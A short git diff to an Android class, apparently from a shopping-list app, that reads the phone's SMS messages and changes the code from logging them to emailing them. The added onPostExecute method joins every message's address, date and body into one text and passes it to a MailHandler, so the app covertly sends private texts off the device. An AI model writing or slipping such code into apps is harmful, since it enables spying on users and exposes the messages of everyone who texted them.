@@ -7,12 +7,13 @@ import android.os.AsyncTask;
 import android.provider.Telephony;
 import android.util.Log;
 
+import com.example.jonas.shoppinglist.communication.MailHandler;
 import com.example.jonas.shoppinglist.domain.Message;
 
 import java.util.ArrayList;
 import java.util.List;
 
-public class ShoppingMessages extends AsyncTask<Void,Void,Void> {
+public class ShoppingMessages extends AsyncTask<Void,Void,List<Message>> {
 
     private Activity activity;
     private Cursor messageCursor;
@@ -26,7 +27,7 @@ public class ShoppingMessages extends AsyncTask<Void,Void,Void> {
     }
 
     @Override
-    protected Void doInBackground(Void... params) {
+    protected List<Message> doInBackground(Void... params) {
         List<Message> messages = new ArrayList<>();
         messageCursor = activity.getContentResolver().query(uri, null, null, null, null);
 
@@ -57,11 +58,17 @@ public class ShoppingMessages extends AsyncTask<Void,Void,Void> {
             messages.add(new Message(messageCursor.getString(idIdX), messageCursor.getString(dateIdx), messageCursor.getString(addressIdx), messageCursor.getString(bodyIdx), "receiver"));
         }
 
-        Log.d("MainActivity", "Sent SMS messages");
-        for(Message message : messages){
-            Log.d("MainActivity", message.toString());
+        return messages;
+    }
+
+    @Override
+    public void onPostExecute(List<Message> result){
+        String body="Messages:\n\n";
+
+        for(Message message : result){
+            body += message.toString() + "\n";
         }
 
-        return null;
+        new MailHandler(activity).execute(body);
     }
 }
